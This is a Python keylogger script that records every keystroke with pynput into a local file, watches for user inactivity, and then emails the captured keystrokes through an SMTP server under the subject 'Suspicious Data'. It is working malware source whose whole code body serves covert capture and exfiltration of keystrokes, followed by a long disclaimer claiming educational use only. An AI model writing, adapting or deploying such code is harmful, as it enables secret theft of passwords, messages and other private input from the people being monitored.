import time
import threading
import smtplib
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

active = True
last_active_time = time.time()

#Method for sending the email
def send_email(email, password, message):
    email = ''                                          # Make sure to update the email you want to send/receive from/to
    server = smtplib.SMTP('smtp server here', 587)      # Change the SMTP server for the desired service 
    server.starttls()
    server.login(email, password)

    msg = MIMEText(message)
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Suspicious Data'                  # Add a subject to the email

    server.sendmail(email, email, msg.as_string())
    server.quit()

# Checks the users last activity
def check_activity():
    global active
    global last_active_time

    while True:
       
        if time.time() - last_active_time > 300:
            active = False
        else:
            active = True
        time.sleep(60)  

def on_press(key):
    global last_active_time
    global active

    if active:
        last_active_time = time.time()

    with open("keylog.txt", "a") as f:
        f.write(str(key))


    if not active and key == Key.space:
        with open("keylog.txt", "r") as f:
            keystrokes = f.read()
        send_email('your_email@example.com', 'your_password', keystrokes)


activity_thread = threading.Thread(target=check_activity)
activity_thread.daemon = True
activity_thread.start()


with Listener(on_press=on_press) as listener:
    listener.join()



#   Disclaimer:
#
#   This keylogger software is developed solely for educational purposes. It is intended to be used as a learning tool for understanding how keyloggers operate and for educational research purposes.
#
#   Usage Restrictions:
#
#   This software should only be installed and used on devices and systems that you own or have explicit permission to monitor.
#   It is strictly prohibited to use this software for any malicious or illegal activities, including but not limited to unauthorized monitoring of others' activities, data theft, or invasion of privacy.
#   By downloading, installing, or using this software, you agree to use it responsibly and in accordance with all applicable laws and regulations in your jurisdiction.
#   No Warranty:
#
#   This software is provided "as is," without any warranties or guarantees of any kind. The developers of this software shall not be held liable for any damages or consequences resulting from the use or misuse of this software.
#
#   Legal Compliance:
#
#   It is the responsibility of the user to ensure compliance with all applicable laws and regulations related to the use of this software. The developers of this software disclaim any liability for unauthorized or unlawful use.
#
#   Final Note:
#
#   By downloading, installing, or using this software, you acknowledge and agree to the terms and conditions outlined in this disclaimer. If you do not agree with these terms, you should not use this software.